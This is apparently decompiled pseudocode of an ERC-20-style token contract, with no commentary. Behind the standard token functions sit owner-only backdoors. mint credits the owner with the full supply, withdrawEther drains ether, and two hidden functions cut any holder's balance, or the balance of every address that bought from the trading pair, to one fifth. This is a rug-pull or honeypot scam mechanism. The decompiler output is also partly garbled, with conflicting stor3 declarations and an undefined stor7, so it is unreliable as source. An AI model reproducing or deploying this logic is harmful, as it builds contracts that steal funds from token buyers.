contract main {




// =====================  Runtime code  =====================


array of uint256 name;
array of uint256 symbol;
uint8 decimals;
bool stor3;
uint256 stor3;
uint256 stor3; offset 1
uint256 totalSupply;
mapping of uint256 balanceOf;
address stor5;
address pairAddress;
array of address sub_96194a55;
mapping of uint256 allowance;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[arg1]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function sub_96194a55(?) {
    require calldata.size - 4 >= 32
    require arg1 < sub_96194a55.length
    return address(sub_96194a55[arg1])
}

function pair() {
    return pairAddress
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function sub_fa69de09(?) {
    require calldata.size - 4 >= 32
    require msg.sender == stor5
    balanceOf[address(arg1)] = balanceOf[address(arg1)] / 5
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg2 > 0
    allowance[msg.sender][address(arg1)] = arg2
    return 1
}

function withdrawEther(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == stor5
    call stor5 with:
       value arg1 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function mint() {
    require msg.sender == stor5
    balanceOf[msg.sender] += totalSupply
    if not totalSupply:
        totalSupply = 0
    else:
        if 2 * totalSupply / totalSupply != 2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x53536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        bool(stor3.field_0) = 0
        uint255(stor3.field_1) = uint255(stor3.field_0)
}

function sub_4cc025f1(?) {
    require msg.sender == stor5
    idx = 0
    while idx < sub_96194a55.length:
        mem[0] = 7
        if address(sub_96194a55[idx]) != pairAddress:
            require idx < sub_96194a55.length
            require msg.sender == stor5
            mem[0] = address(sub_96194a55[idx])
            mem[32] = 4
            balanceOf[address(stor7[idx])] = balanceOf[address(stor7[idx])] / 5
        idx = idx + 1
        continue 
    sub_96194a55.length = 0
    idx = 0
    while sub_96194a55.length > idx:
        uint256(sub_96194a55[idx]) = 0
        idx = idx + 1
        continue 
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1
    require arg2 > 0
    require arg2 <= balanceOf[address(msg.sender)]
    require balanceOf[address(arg1)] + arg2 > balanceOf[address(arg1)]
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(msg.sender)] -= arg2
    if arg2 + balanceOf[arg1] < balanceOf[arg1]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
    if pairAddress == msg.sender:
        sub_96194a55.length++
        address(sub_96194a55[sub_96194a55.length]) = arg1
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg3 <= allowance[address(arg1)][msg.sender]
    require arg2
    require arg3 > 0
    require arg3 <= balanceOf[address(arg1)]
    require balanceOf[address(arg2)] + arg3 > balanceOf[address(arg2)]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(arg1)] -= arg3
    if arg3 + balanceOf[arg2] < balanceOf[arg2]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
    if pairAddress == arg1:
        sub_96194a55.length++
        address(sub_96194a55[sub_96194a55.length]) = arg2
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][msg.sender]:
        revert with 0, 'SafeMath: subtraction overflow'
    allowance[address(arg1)][msg.sender] -= arg3
    return 1
}



}
